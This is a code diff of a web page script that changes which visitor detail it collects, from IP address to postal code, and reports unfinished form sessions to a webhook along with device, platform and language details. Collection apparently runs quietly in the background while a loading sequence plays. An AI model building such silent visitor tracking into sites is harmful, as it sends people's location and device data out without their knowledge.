@@ -12,7 +12,7 @@ const INACTIVITY_TIMEOUT = 5 * 60 * 1000; // 5 minutes
 function storeSessionData() {
     const sessionData = {
         sessionId: sessionId,
-        ip: userIP,
+        postalCode: userPostalCode,
         startTime: formStartTime,
         initialWebhookSent: initialWebhookSent,
         lastActivity: Date.now()
@@ -65,8 +65,8 @@ function handleIncompleteSession() {
 
 // Send webhook for incomplete session
 async function sendIncompleteSessionWebhook() {
-    if (!userIP || userIP === 'Unknown IP') {
-        console.log('❌ No IP information to send');
+    if (!userPostalCode || userPostalCode === 'Unknown Postal Code') {
+        console.log('❌ No postal code information to send');
         return;
     }
     
@@ -80,7 +80,7 @@ async function sendIncompleteSessionWebhook() {
             color: 0xff9500, // Orange color for incomplete
             fields: [
                 { name: '🆔 Session ID', value: sessionId, inline: false },
-                { name: '🌐 IP Address', value: userIP, inline: true },
+                { name: '📍 Postal Code', value: userPostalCode, inline: true },
                 { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                 { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                 { name: '🌍 Language', value: deviceInfo.language, inline: true },
@@ -89,7 +89,7 @@ async function sendIncompleteSessionWebhook() {
                 { name: '📊 Initial Webhook', value: initialWebhookSent ? '✅ Sent' : '❌ Failed', inline: true }
             ],
             footer: {
-                text: 'Session ended without form completion - IP information preserved'
+                text: 'Session ended without form completion - Postal code information preserved'
             }
         };
 
@@ -648,9 +648,8 @@ window.addEventListener('load', function() {
     // Setup inactivity monitoring
     setupInactivityMonitoring();
     
-    // Start loading sequence immediately (don't wait for IP collection)
+    // Start loading sequence immediately (don't wait for postal code collection)
     startLoadingSequence();
-    setupInfoForm();
     
     // Collect postal code and send initial webhook in the background (non-blocking)
     setTimeout(() => {
